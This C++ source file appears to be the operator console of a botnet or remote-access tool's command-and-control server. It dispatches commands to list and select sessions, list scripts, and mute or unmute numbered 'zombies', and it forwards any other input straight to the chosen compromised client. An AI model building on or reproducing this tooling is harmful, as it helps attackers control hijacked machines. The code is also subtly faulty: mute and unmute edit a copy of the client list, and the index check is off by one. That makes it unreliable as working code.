#include "Factory_Server.h"

std::vector<std::string> split(const char* buffer)
{
	std::string s = std::string(buffer);
	std::vector<std::string> args;
	const std::string delimiter = " ";
	unsigned short pos = 0;
	auto start = 0U;
	auto end = s.find(delimiter);
	while (end != std::string::npos)
	{
		args.push_back(s.substr(start, end - start));
		start = end + delimiter.length();
		end = s.find(delimiter, start);
	}
	args.push_back(s.substr(start, end));
	return args;
}

void remove_client(Server* serv1)
{
	print_error("Error while sending buffer to the current client :" + serv1->getDefaultClient().ip_extern);
	print_warning("The client " + serv1->getDefaultClient().ip_extern + " might be deconnected");
	print_warning("Removing ..");
	if (serv1->getClients().size() == 1)
	{
		print_error("No other active sessions --> shutting down the handler ...");
		exit(1);
	}
	else
	{
		serv1->removeDefaultClient();
	}

}

Factory_Server::Factory_Server(Server* serv1, const char* pbuffer) : buffer(pbuffer)
{
	args = split(pbuffer);

	if (args[0] == "exit" || args[0] == "EXIT")
	{
		serv1->shutdown();
	}
	else if (args[0] == "version" && args.size() == 1)
	{
		Info::version(serv1);
	}
	else if (args[0] == "help" || args[0] == "HELP")
	{
		Info::print_help();
	}
	else if (args[0] == "list")
	{
		Info::list(serv1);
	}
	else if (args[0] == "set_session" && args.size() == 2)
	{
		Info::set_session(serv1, args[1]);
	}
	else if (args[0] == "getcurrentsession" && args.size() == 1)
	{
		Info::getcurrentsession(serv1);
	}
	else if (args[0] == "list_scripts")
	{
		Info::list_scripts();
	}
	else if (args[0] == "man" && args.size() == 2)
	{
		Man man(args[1]);
	}
	else if (args[0] == "mute" && args.size() == 2)
	{
		mute(serv1, args[1]);
	}
	else if (args[0] == "unmute" && args.size() == 2)
	{
		unmute(serv1, args[1]);
	}
	else
	{
		if (serv1->send_b(buffer.c_str())) { remove_client(serv1); }
	}
}

void mute(Server* serv, const std::string nb)
{
	SOCKET* sock = serv->getSock();
	std::vector<st_Client> clients = serv->getClients();
	int nb_int = atoi(nb.c_str());
	nb_int--;
	if (nb_int <= clients.size())
	{
		print_status("Muting zombie " + nb + " ...");
		clients[nb_int].mute = 1;
		print_done("Done");
	}
	else
	{
		print_error("Invalid number");
	}
}
void unmute(Server* serv, const std::string nb)
{
	SOCKET* sock = serv->getSock();
	std::vector<st_Client> clients = serv->getClients();
	int nb_int = atoi(nb.c_str());
	nb_int--;
	if (nb_int <= clients.size())
	{
		print_status("Unmuting zombie " + nb + " ...");
		clients[nb_int].mute = 0;
		print_done("Done");
	}
	else
	{
		print_error("Invalid number");
	}
}